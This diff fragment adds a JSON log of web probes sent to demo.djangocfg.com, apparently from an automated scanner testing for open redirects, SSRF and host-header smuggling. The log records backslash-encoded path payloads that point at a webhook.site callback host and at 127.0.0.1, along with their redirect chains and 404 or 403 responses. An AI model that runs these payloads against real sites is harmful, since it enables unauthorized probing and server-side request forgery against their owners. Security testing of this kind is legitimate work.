+          "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "host_smuggle_1_host_127.0.0.1": {
+      "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 403
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 403,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>403 Forbidden</title></head>\r\n<body>\r\n<center><h1>403 Forbidden</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "host_smuggle_1_host_localhost": {
+      "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 403
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 403,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>403 Forbidden</title></head>\r\n<body>\r\n<center><h1>403 Forbidden</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "host_smuggle_1_host_en8q-xxxxxx.webhook.site": {
+      "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 403
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 403,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>403 Forbidden</title></head>\r\n<body>\r\n<center><h1>403 Forbidden</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "host_smuggle_2": {
+      "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "127.0.0.1"
+      ]
+    },
+    "host_smuggle_2_host_127.0.0.1": {
+      "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+          "final_status": 403
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+            "status": 403,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>403 Forbidden</title></head>\r\n<body>\r\n<center><h1>403 Forbidden</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "127.0.0.1"
+      ]
+    },
+    "host_smuggle_2_host_localhost": {
+      "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+          "final_status": 403
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+            "status": 403,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>403 Forbidden</title></head>\r\n<body>\r\n<center><h1>403 Forbidden</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "127.0.0.1"
+      ]
+    },
+    "host_smuggle_2_host_en8q-xxxxxx.webhook.site": {
+      "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+          "final_status": 403
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5C127.0.0.1:80?ultra=dowkmb3a",
+            "status": 403,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>403 Forbidden</title></head>\r\n<body>\r\n<center><h1>403 Forbidden</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "127.0.0.1"
+      ]
+    },
+    "api_fetch_probe": {
+      "path": "/api/fetch/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/api/fetch/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/api/fetch/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/api/fetch/%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/api/fetch/%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/api/fetch/%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "dynamic_user_probe": {
+      "path": "/user/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/user/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/user/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/user/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/user/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/user/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "search_probe": {
+      "path": "/search?q=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/search?q=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/search?q=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&ultra=dowkmb3a",
+            "status": 308,
+            "location": "/search/?q=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&ultra=dowkmb3a",
+            "snippet": "/search/?q=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/search/?q=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    }
+  }
+}
